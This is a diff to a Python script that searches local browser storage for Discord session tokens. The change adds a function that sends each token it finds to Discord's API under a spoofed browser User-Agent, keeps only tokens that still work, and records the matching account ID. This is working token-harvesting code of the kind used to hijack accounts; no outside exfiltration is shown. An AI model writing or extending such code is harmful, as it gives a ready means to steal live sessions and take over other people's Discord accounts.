@@ -212,6 +212,27 @@ def scan_local_domain_cookies(domain_filter):
     return all_found
 
 
+def verify_discord_token_api(token):
+    if not token:
+        return False, None
+    import urllib.request, urllib.error
+    req = urllib.request.Request(
+        "https://discord.com/api/v9/users/@me",
+        headers={
+            "Authorization": token.strip().strip('"'),
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+        }
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            if resp.status == 200:
+                info = json.loads(resp.read().decode("utf-8", errors="ignore"))
+                return True, str(info.get("id") or "")
+    except Exception:
+        pass
+    return False, None
+
+
 def scan_local_discord_session():
     """
     Scans local desktop browsers (LibreWolf/Firefox, Chromium, Brave, Chrome)
@@ -258,12 +279,16 @@ def scan_local_discord_session():
                         chunk = data[m.end():m.end() + 240]
                         jm = jwt_re.search(chunk)
                         if jm:
-                            token = jm.group(1).decode("ascii", errors="ignore")
-                            um = uid_re.search(chunk)
-                            if um:
-                                uid = um.group(1).decode("ascii", errors="ignore")
-                            print(f"[+] Found active Discord session token in local LevelDB: {ldir} (UID: {uid or 'auto'})")
-                            break
+                            cand_tok = jm.group(1).decode("ascii", errors="ignore")
+                            is_valid, api_uid = verify_discord_token_api(cand_tok)
+                            if is_valid:
+                                token = cand_tok
+                                um = uid_re.search(chunk)
+                                uid = api_uid or (um.group(1).decode("ascii", errors="ignore") if um else None)
+                                print(f"[+] Found VALID active Discord session token in local LevelDB: {ldir} (UID: {uid or 'auto'})")
+                                break
+                            else:
+                                print(f"[-] Ignored expired Discord token in {ldir} (HTTP 401)")
                     if token:
                         break
                 except Exception:
@@ -292,7 +317,11 @@ def scan_local_discord_session():
                         raw_bytes = val if isinstance(val, bytes) else str(val).encode("utf-8", errors="ignore")
                         jm = jwt_re.search(raw_bytes)
                         if jm:
-                            token = jm.group(1).decode("ascii", errors="ignore")
+                            cand_tok = jm.group(1).decode("ascii", errors="ignore")
+                            is_valid, api_uid = verify_discord_token_api(cand_tok)
+                            if is_valid:
+                                token = cand_tok
+                                uid = api_uid or uid
                         um = uid_re.search(raw_bytes)
                         if um and not uid:
                             uid = um.group(1).decode("ascii", errors="ignore")
